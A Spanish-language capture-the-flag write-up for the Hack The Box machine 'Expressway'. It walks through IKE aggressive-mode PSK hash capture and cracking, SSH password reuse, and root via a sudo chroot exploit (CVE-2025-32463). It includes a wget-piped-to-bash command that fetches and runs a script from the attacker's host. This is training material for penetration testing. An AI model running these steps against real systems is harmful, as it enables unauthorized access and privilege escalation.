---
title: "Expressway - Hack The Box"
date: 2025-09-26
draft: false
slug: "htb-writeup-expressway"
excerpt: "Esta fue una máquina un poco complicada en cuanto a la escalada de privilegios. Después de analizar el escaneo y al no encontrar algún puerto abierto, más que el puerto 22, se realiza un escaneo por UDP, encontrando el puerto 500 abierto que pertenece al protocolo IKE. Analizamos el protocolo IKE con la herramienta ike-scan, logrando obtener un usuario y el hash de la clave PSK, que logramos crackear con la herramienta psk-crack. Al no tener credenciales válidas del atributo XAUTH del protocolo IKE, utilizamos el usuario y la contraseña crackeada de la clave PSK para ganar acceso a la máquina víctima vía SSH. Dentro, no encontramos una vulnerabilidad como tal, hasta que vemos la versión del comando sudo, siendo una versión vulnerable que nos permite escalar privilegios usando el Exploit CVE-2025-32463, siendo así que nos convertimos en Root."
categories: ["HackTheBox", "Easy Machine"]
tags: ["Linux", "IKE Protocol", "Cracking Hash", "Cracking PSK Hash", "System Recongnition (Linux)", "Sudo Chroot Privilege Escalation Exploit (CVE-2025-32463)", "CVE-2025-32463", "Privesc - Sudo Chroot Privilege Escalation Exploit (CVE-2025-32463)", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "ike-scan"
  - "psk-crack"
  - "ssh"
  - "sudo"
  - "id"
  - "python3"
  - "wget"
  - "bash"
  - "linpeas.sh"
  - "chmod"
links:
  - "https://angelica.gitbook.io/hacktricks/network-services-pentesting/ipsec-ike-vpn-pentesting"
  - "https://www.verylazytech.com/network-pentesting/ipsec-ike-vpn-port-500-udp"
  - "https://libreswan.org/man/ipsec.conf.5.html"
  - "https://wiki.strongswan.org/projects/strongswan/wiki/connsection"
  - "https://github.com/peass-ng/PEASS-ng"
  - "https://github.com/KaiHT-Ladiant/CVE-2025-32463"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-expressway/Expressway.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 10.10.11.87
PING 10.10.11.87 (10.10.11.87) 56(84) bytes of data.
64 bytes from 10.10.11.87: icmp_seq=2 ttl=63 time=69.8 ms
64 bytes from 10.10.11.87: icmp_seq=3 ttl=63 time=97.1 ms
64 bytes from 10.10.11.87: icmp_seq=4 ttl=63 time=74.1 ms

--- 10.10.11.87 ping statistics ---
4 packets transmitted, 3 received, 25% packet loss, time 3031ms
rtt min/avg/max/mdev = 69.809/80.330/97.065/11.963 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.87 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-26 12:02 CST
Initiating SYN Stealth Scan at 12:02
Scanning 10.10.11.87 [65535 ports]
Discovered open port 22/tcp on 10.10.11.87
Completed SYN Stealth Scan at 12:02, 23.37s elapsed (65535 total ports)
Nmap scan report for 10.10.11.87
Host is up, received user-set (0.43s latency).
Scanned at 2025-09-26 12:02:35 CST for 23s
Not shown: 34055 closed tcp ports (reset), 31479 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 23.50 seconds
           Raw packets sent: 113847 (5.009MB) | Rcvd: 35191 (1.408MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Esto es bastante extraño, pues no aparecen más puertos aparte del **puerto 22**.

Tratemos de escanear los puertos de la máquina víctima vía **UDP**:
```bash
nmap -sU --top-ports 1000 --open -T5 -vv -n 10.10.11.87 -oN udpScan
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-26 12:03 CST
Initiating Ping Scan at 12:03
Scanning 10.10.11.87 [4 ports]
Completed Ping Scan at 12:03, 0.10s elapsed (1 total hosts)
Initiating UDP Scan at 12:03
Scanning 10.10.11.87 [1000 ports]
Warning: 10.10.11.87 giving up on port because retransmission cap hit (2).
Discovered open port 500/udp on 10.10.11.87
Increasing send delay for 10.10.11.87 from 0 to 50 due to 11 out of 21 dropped probes since last increase.
Increasing send delay for 10.10.11.87 from 50 to 100 due to 11 out of 22 dropped probes since last increase.
Increasing send delay for 10.10.11.87 from 100 to 200 due to 11 out of 26 dropped probes since last increase.
Increasing send delay for 10.10.11.87 from 200 to 400 due to 11 out of 16 dropped probes since last increase.
Increasing send delay for 10.10.11.87 from 400 to 800 due to 11 out of 11 dropped probes since last increase.
Completed UDP Scan at 12:09, 346.92s elapsed (1000 total ports)
Nmap scan report for 10.10.11.87
Host is up, received echo-reply ttl 63 (0.079s latency).
Scanned at 2025-09-26 12:03:39 CST for 346s
Not shown: 677 open|filtered udp ports (no-response), 322 closed udp ports (port-unreach)
PORT    STATE SERVICE REASON
500/udp open  isakmp  udp-response ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 347.49 seconds
           Raw packets sent: 2606 (122.968KB) | Rcvd: 356 (26.824KB)
```

| Parámetros | Descripción |
|---|---|
| *-sU*      | Para realizar un escaneo por UDP. |
| *--top-ports* | Para escanear los puertos más comunes. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-T*       | Para indicar el tiempo del escaneo de 0 a 5 (entre más rápido, más fácil de detectar). |
| *-v*       | Para indicar un verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Muy bien, encontramos el **puerto 500** activo.

### Escaneo de Servicios {#Servicios}

Investigando ese puerto, resulta ser del **protocolo IKE**:

| **Protocolo IKE** |
|:-------------:|
| *El puerto UDP 500 se utiliza principalmente para el protocolo IKE (Internet Key Exchange), que es el componente central de IPsec para el establecimiento y la gestión de túneles de VPN seguros a través de Internet. Este puerto permite las negociaciones iniciales, la autenticación y el intercambio de claves de cifrado necesarios antes de que la comunicación VPN se establezca y se transmita.* |

Usemos un **NSE Script** de **Nmap** para obtener información del **protocolo IKE**:
```bash
nmap -sU -p 500 --script ike-version 10.10.11.87
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-26 12:11 CST
Nmap scan report for 10.10.11.87
Host is up (0.070s latency).

PORT    STATE SERVICE
500/udp open  isakmp

| ike-version: 
|   attributes: 
|     XAUTH
|_    Dead Peer Detection v1.0

Nmap done: 1 IP address (1 host up) scanned in 0.58 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

El escaneo nos da algo de información, aunque no pudo detectar la versión de **IKE**, pero sí nos da algunos atributos como:
* El soporte para **XAUTH (Extended Authentication)**, que en resumen el servidor puede requerir un usuario y contraseña (**XAUTH**) para completar la autenticación, además del uso de **PSK**.
* Indica que el equipo **soporta DPD**, que es un protocolo que detecta **peers** caídos y renegocia/limpia **SAs** cuando un peer no responde. Esto es útil para **fingerprinting**.

Veamos qué más podemos obtener de este protocolo.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Protocolo IKE {#IKE}

Ve el siguiente blog que es de bastante ayuda para aplicar pentesting al **protocolo IKE**:
* <a href="https://www.verylazytech.com/network-pentesting/ipsec-ike-vpn-port-500-udp" target="_blank">IPsec/IKE VPN - Port 500/UDP</a>

Ahí mismo nos indica el uso de la herramienta **ike-scan**, que sirve para el descubrimiento y **huella digital (fingerprint)** de **IKE hosts**.

La idea principal es poder capturar la **PSK**:

| **Pre-Shared Key (PSK)** |
|:------------------------:|
| *Es una secreta simétrica (una contraseña/ frase) que ambas partes de una VPN IKE/IPsec conocen de antemano y usan para autenticarse en la Fase 1 (IKE SA). Si el PSK coincide entre cliente y servidor, esa parte de la autenticación pasa; si no, falla con AUTH_FAILED.* |

Con el modo agresivo de la herramienta **ike-scan**, podemos obtener más información del **protocolo IKE** como una identidad, la propuesta de seguridad (algoritmo de cifrado, tipo de autenticación, etc), el **Vendor ID (VID)**, etc:
```bash
ike-scan -M -A 10.10.11.87
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87	Aggressive Mode Handshake returned
	HDR=(CKY-R=93cccecdd5fb5767)
	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
	KeyExchange(128 bytes)
	Nonce(32 bytes)
	ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
	VID=09002689dfd6b712 (XAUTH)
	VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
	Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.087 seconds (11.49 hosts/sec).  1 returned handshake; 0 returned notify
```
Expliquemos el resultado de este escaneo:
* El host respondió usando **Aggressive Mode (IKEv1)**. Esto es importante porque **Aggressive Mode** suele filtrar/mostrar identidades y deja suficiente material para atacar el **PSK offline**.
* **CKY-R** es la cookie (**responder cookie**) enviada por el servidor, que sirve para identificar la **sesión ISAKMP** y prevenir ciertos ataques. No es sensible por sí misma, pero aparece en el **handshake**.
* La propuesta de seguridad que el servidor acepta es:
	* Uso del **algoritmo de cifrado 3DES**, que es algo antiguo (`Enc=3DES`).
	* Uso del **HMAC-SHA1** para integridad (`Hash=SHA1`).
	* EL uso de **DH group 2: 1024-bit MODP** (`Group=2:modp1024`)
	* El método de autenticación es **Pre-Shared Key** (`Auth=PSK`).
	* La duración de la SA en segundos (`LifeDuration=28800`, 8 horas).
* El servidor devolvió su **material DH (KE)** y un **nonce**; esos valores, combinados con el **PSK** y otros datos, sirven para calcular claves y hashes durante la autenticación.
* El servidor incluye una identidad de tipo **ID_USER_FQDN** con el valor `ike@expressway.htb`. Esto puede indicar la identidad que el servidor espera o la identidad que el cliente debe usar.
* En el Vendor ID; el servidor anuncia las capacidades:
	* Uso de **XAUTH**. Si el servidor requiere **XAUTH**, el **PSK** solo no permite completar la conexión; necesitas **credenciales XAUTH**.
	* **Dead Peer Detection (DPD)** → soporta DPD para detectar peers caídos. No es explotable por sí mismo, pero es fingerprinting útil.
* El **Hash(20 bytes)** indica un **hash SHA1 (20 bytes)**, que es el **hash/HMAC** derivado del **PSK** y otros valores del intercambio.

Lo importante aquí:
* Se pudo identificar el **Aggressive Mode (IKEv1)**, que nos puede permitir obtener el **PSK**.
* La autenticación **Auth=PSK** más la presencia de **Hash(20 bytes)**, nos indica que es posible crackear de forma offline si es que podemos obtener el **PSK**
* El uso del **XAUTH**, que nos indica el posible uso obligatorio de credenciales extras para la autenticación.
* Y tenemos una identidad de tipo **ID_USER_FQDN** con el valor `ike@expressway.htb`.

Tratemos de obtener el **PSK**.

## Explotación de Vulnerabilidades {#Explotacion}

### Obtención y Crackeo de PSK y Ganando Acceso a la Máquina Víctima Vía SSH {#PSK}

Podemos aplicar 2 formas para intentar obtener el **PSK** con la herramienta **ike-scan**.

La primera sería usando la flag `--pskcrack` para obtener el **PSK** de forma directa:
```bash
ike-scan -A --pskcrack 10.10.11.87
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87	Aggressive Mode Handshake returned HDR=(CKY-R=c1936d1c28da6029) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
0b3aca1bac7c6632ac1dbbcb8a7959aee25c0a8c7b89d0e4246ef3e21e760eb9f02661ca3efaad08065b7adf7c98ac18a4829a98abdf761e1e120edbd8cc2d19214ce587d33498c1d61ddea55b429caeeaacff4d8f4d7c489e691a6c44826250e95e1cd2feafdb1ee72f0349cfae552751ea5357d8aa6bc9ec30fe645bde514e:f49d76eb68034f139359cfafff7b8f5dcde6fcf053b5637e2269bbe88a833acbb8c51e48fd9da13e45423662a78750861424acc4b570414f7171cb6365db8283a86fd1237b4de5b0ae4b16771d9eb1ffd010b640deda506e0f3c913ecb50da732a0e8326f5f97a16dead2474d1771af49262908ec2046242f0697da7d5680e93:c1936d1c28da6029:eea09bda60a0ba69:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:292f43f49fa8997a3ce63c41fb3631d2fe4938e9:0730335c68c68630e479ec8e87302446d2f9dd691428a03b974932e5f887fcce:f760963359540ef23665a1fd726ab99fa423e232
Ending ike-scan 1.9.6: 1 hosts scanned in 0.082 seconds (12.20 hosts/sec).  1 returned handshake; 0 returned notify
```
Ahí lo tenemos, es todo ese hash debajo del **IKE PSK parameters**.

La segunda sería usando la flag `-P` (que es lo mismo que la flag `--pskcrack`), pero si le agregamos enseguida un nombre, se generará un archivo con el nombre que diste y contendrá la **PSK**:
```bash
ike-scan -M -A -Pike_psk.params 10.10.11.87
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned
        HDR=(CKY-R=061b5594bfb4535f)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.085 seconds (11.77 hosts/sec).  1 returned handshake; 0 returned notify
```
El nombre que use es **ike_psk.params** y se generó correctamente.

Ahora, para crackear ese hash, podemos utilizar la herramienta **psk-crack**, utilizando el modo diccionario para asignarle un wordlist que nos sirva para crackear la **PSK**:
```bash
psk-crack -d /usr/share/wordlists/rockyou.txt ike_psk.params
Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "********************" matches SHA1 hash 0d141798ba758678596b6878f140d42fdb51dd20
Ending psk-crack: 8045040 iterations in 12.824 seconds (627361.61 iterations/sec)
```
Tenemos la contraseña.

Podríamos intentar configurar un **cliente IPsec** como **StrongSwan** para establecer la **VPN/SA** y ver si podemos obtener acceso a la red interna.

Para ello tendríamos que crear/modificar 2 archivos llamados **ipsec.conf** e **ipsec.secret**, con datos del **protocolo IKE**. 

El problema es que necesitaremos credenciales de **XAUTH** que no tenemos.

Algo que si tenemos, es un usuario llamado **ike**, por lo que quizá este usuario exista en la máquina víctima. Además, podemos probar la contraseña del **PKS** por si este usuario la utiliza:
```bash
ssh ike@10.10.11.87
ike@10.10.11.87's password: 
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64
...
Last login: Fri Sep 26 20:44:17 2025
ike@expressway:~$ whoami
ike
```
Excelente, estamos dentro.

Aquí podemos encontrar la flag del usuario:
```bash
ike@expressway:~$ ls
user.txt
ike@expressway:~$ cat user.txt
...
```

## Post Explotación {#Post}

### Explotando Vulnerabilidad de la Versión 1.9.17 de Sudo para Escalar Privilegios {#sudo}

Veamos qué privilegios tiene nuestro usuario:
```bash
ike@expressway:~$ sudo -l
Password: 
Sorry, user ike may not run sudo on expressway.
```
No tenemos privilegios.

Veamos a qué grupos pertenecemos:
```bash
ike@expressway:~$ id
uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
```
No veo una forma de abusar del **grupo Proxy**.

Podemos utilizar la herramienta **linpeas.sh** para tratar de identificar una vulnerabilidad.

Puedes descargarlo aquí:
* <a href="https://github.com/peass-ng/PEASS-ng" target="_blank">Repositorio de peass-ng: PEASS-ng</a>

Levanta un servidor con **Python3** en donde tengas el **linpeas.sh**:
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Y vamos a ejecutarlo de forma remota desde la máquina víctima con **wget** y **bash**:
```bash
ike@expressway:~$ wget -qO- http://<Tu_IP>/linpeas.sh | bash
```
Analizando el resultado, no encontraremos algo como tal que nos ayude, más que la llave privada **id_rsa** del **usuario ike**.

Pero algo que sí podemos ver, es la versión del comando **sudo**:
```bash
╔══════════╣ Sudo version
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version
Sudo version 1.9.17
```
Resulta que esta versión desactualizada es vulnerable, lo que nos puede permitir escalar privilegios para convertirnos en **Root**.

Podemos comprobar la versión de **sudo** de la siguiente forma:
```bash
ike@expressway:~$ sudo -V
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
```

Buscando en internet, encontraremos varios Exploits para esta versión de **sudo**, siendo la que yo ocuparé la siguiente:
* <a href="https://github.com/KaiHT-Ladiant/CVE-2025-32463" target="_blank">Repositorio de KaiHT-Ladiant: CVE-2025-32463</a>

El repositorio nos indica que si cumplimos los siguientes requisitos, el Exploit funcionará:
* El sistema corre la versión de **sudo 1.9.14 a 1.9.17**, que ya comprobamos que usa la **versión 1.9.17**
* El usuario actual tiene privilegios de **sudo**, que ya comprobamos que nuestro usuario no tiene alguno.
* La configuración de **sudoers** permite operaciones **chroot**. No hay una forma como tal para comprobarlo, pero puedes ejecutar el siguiente comando: `sudo -l 2>/dev/null | grep -i chroot || true`.
* El compilador **gcc** está disponible en el sistema actual. Podemos identificar si existe el comando **gcc** con el comando **which**: `which gcc`.
* Acceso de escritura a directorios temporales (por ejemplo, `/tmp`). Esto lo podemos hacer con el comando `ls -ld /tmp` y viendo qué permisos tiene el directorio `/tmp`.

Como tal, tenemos todo menos los privilegios de **sudo**, pero aun así, vamos a probar si funciona el Exploit.

Descárgalo clonando el repositorio o solamente copiando el script:
```bash
wget https://raw.githubusercontent.com/KaiHT-Ladiant/CVE-2025-32463/refs/heads/main/cve-2025-32463.sh
```

Copia el Exploit en la máquina víctima usando un servidor de **Python3** y el comando **wget**:
```bash
ike@expressway:~$ wget http://<Tu_IP>/cve-2025-32463.sh
ike@expressway:~$ ls
cve-2025-32463.sh  linpeas_fat.sh  pspy64  user.txt
```

Démosle permisos de ejecución y ejecutemos el Exploit:
```bash
ike@expressway:~$ chmod +x cve-2025-32463.sh 
ike@expressway:~$ ./cve-2025-32463.sh 
[*] Exploiting CVE-2025-32463...
[*] Attempting privilege escalation...
root@expressway:/# whoami
root
```
Listo, somos **Root**.

Obtengamos la última flag:
```bash
root@expressway:/# cd /root
root@expressway:/root# ls
root.txt
root@expressway:/root# cat root.txt
```
Y con esto, terminamos la máquina.
